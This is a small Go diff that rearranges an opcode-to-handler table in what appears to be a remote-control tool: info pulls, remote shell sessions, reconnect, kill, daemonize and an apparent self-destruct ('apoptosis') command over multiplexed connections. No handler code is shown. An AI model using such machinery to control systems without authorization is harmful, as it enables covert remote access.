@@ -70,13 +70,19 @@ var initOps = func () {
 	ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))
 
 	ops[B_info] = pullInfo
-	ops[B_fast] = fastC
-	ops[B_reconn] = ccX
-	ops[B_kill] = ccX
+	ops[B_fast0] = fastC
+	ops[B_fast1] = fastC
+	ops[B_fast2] = fastC
 
 	ops[B_shs] = sh
 	ops[B_shk] = sh
 	ops[B_csh] = sh
+
+	ops[B_ppend] = ppX
+	ops[B_ppkill] = ppX
+
+	ops[B_reconn] = ccX
+	ops[B_kill] = ccX
 
 	ops[B_dodaemon] = ccX
 	ops[B_apoptosis] = ccX
